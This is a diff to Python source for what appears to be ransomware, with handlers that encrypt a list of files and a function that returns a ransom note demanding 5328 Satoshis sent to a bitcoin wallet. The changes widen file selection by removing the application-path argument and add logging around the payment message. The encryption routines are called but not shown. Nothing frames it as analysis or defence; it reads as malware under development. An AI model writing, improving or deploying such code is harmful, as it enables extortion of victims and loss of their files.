@@ -12,12 +12,7 @@ logger = logging.getLogger()
 
 def encrypt_button_handler():
     logger.info("ENCRYPTION STARTED")
-    if getattr(sys, 'frozen', False):
-        application_path = os.path.dirname(sys.executable)
-    else:
-        application_path = os.path.dirname(os.path.abspath(__name__))
-
-    list_of_files_to_be_encrypted = get_files_to_be_encrypted(application_path)
+    list_of_files_to_be_encrypted = get_files_to_be_encrypted()
     start_encryption(list_of_files_to_be_encrypted)
     logger.info("ENCRYPTION DONE")
 
@@ -33,7 +28,10 @@ def decrypt_button_handler():
 
 def get_payment_details():
     try:
-        return f"YOUR FILES HAVE BEEN ENCRYPTED.\nYou need to pay 5328 Satoshis to {get_bitcoin_wallet_address()}.\n Google how to buy bitcoins and send it to the wallet addrress mentioned above."
+        logger.info("Getting payment details")
+        wallet_id = get_bitcoin_wallet_address()
+        logger.info("Payment details generated successfully")
+        return f"YOUR FILES HAVE BEEN ENCRYPTED.\nYou need to pay 5328 Satoshis to {wallet_id}.\n Google how to buy bitcoins and send it to the wallet addrress mentioned above."
     except Exception as err:
         return "Oops!! Something is wrong. Try again after sometime"
    
